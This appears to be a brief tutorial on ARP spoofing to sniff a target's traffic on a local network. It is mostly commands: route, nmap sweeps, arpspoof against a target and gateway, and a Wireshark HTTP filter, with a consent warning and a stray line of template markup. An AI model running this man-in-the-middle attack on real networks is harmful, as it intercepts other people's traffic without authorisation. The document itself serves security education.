# ARP Spoofing

### Tools

arpspoof \(kali\) -- works by forging ARP replies to communicating parties

**Requirements**

arpspoof / dsniff

Wireshark

### Sniffing on a private network - Step by Step

Figure out the Default Gateway first by command:

\*\*terminal

\*\*\[prompt foo@joe\]\*\*\[path ~\]\*\*\[delimiter  $ \]\*\*\[command ./myscript\]



```
route -n
```

Narrow down the target by running \`nmap\` sweep

> Be sure to get written consent for any network scanning activities. Criminal penalties can be levied onto you if permission is not granted.

```
nmap [host-network]
```

To start ARP spoofing, run

```
sudo arpspoof -i [interfacename] -c host -t [target-ip] [default-gateway-ip]
```

e.g.

```
sudo arpspoof -i wlan0 -c host -t 192.168.1.122 192.168.1.1
```

arpspoof should now be sending arp replies to the gateway and target with spoofed addresses

Open Wireshark and apply the `tcp port http` to listen to unencrypted traffic between the router and the target.

```
tcp port http
```

Once done, stop the `arpspoof` process to depoison ARP tables in gateway and target.

```
> arpspoof
[Ctrl+C] to send SIGINT signal
```



